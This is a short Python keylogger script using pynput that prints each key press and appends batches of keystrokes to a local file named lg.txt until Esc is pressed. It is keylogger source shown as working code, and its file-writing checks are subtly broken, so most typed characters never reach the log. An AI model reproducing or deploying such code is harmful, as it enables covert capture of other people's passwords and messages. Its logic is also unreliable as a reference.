from pynput.keyboard import Key, Listener
"""
Requirements:
    pynput
"""

count = 0
keys = []

def on_press(item):
	global keys, count

	keys.append(item)
	count += 1
	print("{0} pressed".format(item))

	if count >= 10:
		count = 0
		wr_file(keys)
		keys = []

def wr_file(item):
	with open("lg.txt", "a") as f:
		
		for key in item:
			k = str(key).replace("'","")
			if k.find("space") > 0:
				f.write("\n")
			elif k.find("Key") == 1:
				f.write(k)

def on_release(item):
	if item == Key.esc:
		return False

with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()